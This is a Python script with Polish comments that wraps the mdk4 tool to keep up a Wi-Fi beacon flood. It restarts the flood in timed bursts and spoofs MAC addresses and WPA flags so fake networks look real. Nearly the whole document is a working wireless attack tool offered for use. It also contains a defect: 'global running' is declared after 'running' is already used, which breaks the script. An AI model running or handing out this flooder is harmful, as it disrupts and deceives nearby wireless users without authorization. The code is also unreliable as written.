from rich.console import Console
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn
from rich.prompt import Prompt, Confirm
import subprocess
import time
import threading
import sys
import os
import signal

console = Console()

# ---------------------- konfiguracja ----------------------
INTERFEJS = "wlan0"          # zmień na swój (np. wlan1mon po airmon-ng start wlan0)
PAKIETY_NA_SEKUNDE = 120     # 80–200 to rozsądny zakres, wyżej może crashować kartę
CZAS_BURSTA = 45             # ile sekund flood → potem restart (żeby beacon-y nie znikały za szybko)
PRZERWA = 5                  # ile sekund przerwy między burstami

# Opcjonalne flagi mdk4 (dodaj co chcesz)
# -a = non-printable chars w SSID
# -m = MAC spoofing / randomization
# -w = WPA flagi (wygląda bardziej realnie)
# -c 1,6,11 = konkretne kanały
MDK4_FLAGS = ["-s", str(PAKIETY_NA_SEKUNDE), "-m", "-w"]   # przykładowo

# ----------------------------------------------------------


running = True
mdk_process = None


def kill_mdk():
    global mdk_process
    if mdk_process and mdk_process.poll() is None:
        mdk_process.terminate()
        try:
            mdk_process.wait(timeout=3)
        except:
            mdk_process.kill()
        console.print("[red]Zabito poprzedni mdk4[/]")


def run_flood():
    global mdk_process

    cmd = ["mdk4", f"{INTERFEJS}mon", "b"] + MDK4_FLAGS
    # jeśli chcesz konkretne SSID-y z pliku: + ["-f", "lista_ssid.txt"]

    console.print(f"[yellow]Uruchamiam mdk4: {' '.join(cmd)}[/]")

    mdk_process = subprocess.Popen(
        cmd,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        preexec_fn=os.setsid   # żeby kill - gid zadziałał na całą grupę
    )


def flood_loop():
    while running:
        kill_mdk()           # na wszelki wypadek
        run_flood()
        console.print(f"[green bold]Beacon flood aktywny[/] ({CZAS_BURSTA} s) ...")

        for _ in range(CZAS_BURSTA):
            if not running:
                break
            time.sleep(1)

        if running:
            console.print("[yellow]Restart floodu za chwilę...[/]")
            time.sleep(PRZERWA)


def main():
    console.clear()
    console.rule("Beacon Flood – podtrzymywany 😈", style="bold red")

    console.print(Panel.fit(
        f"Interfejs: [cyan]{INTERFEJS}mon[/]\n"
        f"Prędkość:  [cyan]{PAKIETY_NA_SEKUNDE} pkt/s[/]\n"
        f"Burst:      [cyan]{CZAS_BURSTA} s[/] + {PRZERWA} s przerwy\n"
        "Wpisz [bold]q[/] + Enter żeby zatrzymać\n"
        "[dim]Uwaga: wymaga roota i monitor mode![/]",
        title="Konfiguracja", border_style="bright_blue"
    ))

    if not Confirm.ask("[bold red]Kontynuować? (musi być monitor mode włączony)[/]"):
        return

    # wątek floodu
    flood_thread = threading.Thread(target=flood_loop, daemon=True)
    flood_thread.start()

    console.print("\n[bold green]Flood działa w tle![/]")
    console.print("[yellow]Wpisz q + Enter żeby zakończyć[/]\n")

    try:
        while running:
            inp = console.input("[bold]→ [/]")
            if inp.strip().lower() in ("q", "quit", "exit"):
                break
    except KeyboardInterrupt:
        pass

    global running
    running = False
    console.print("\n[yellow]Zatrzymuję flood...[/]")

    kill_mdk()
    time.sleep(1.5)

    console.print("[green bold]Zrobione. Fake sieci powinny zacząć znikać za 10–90 sekund.[/]")


if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        console.print(f"[red]Błąd: {e}[/]")
    finally:
        kill_mdk()
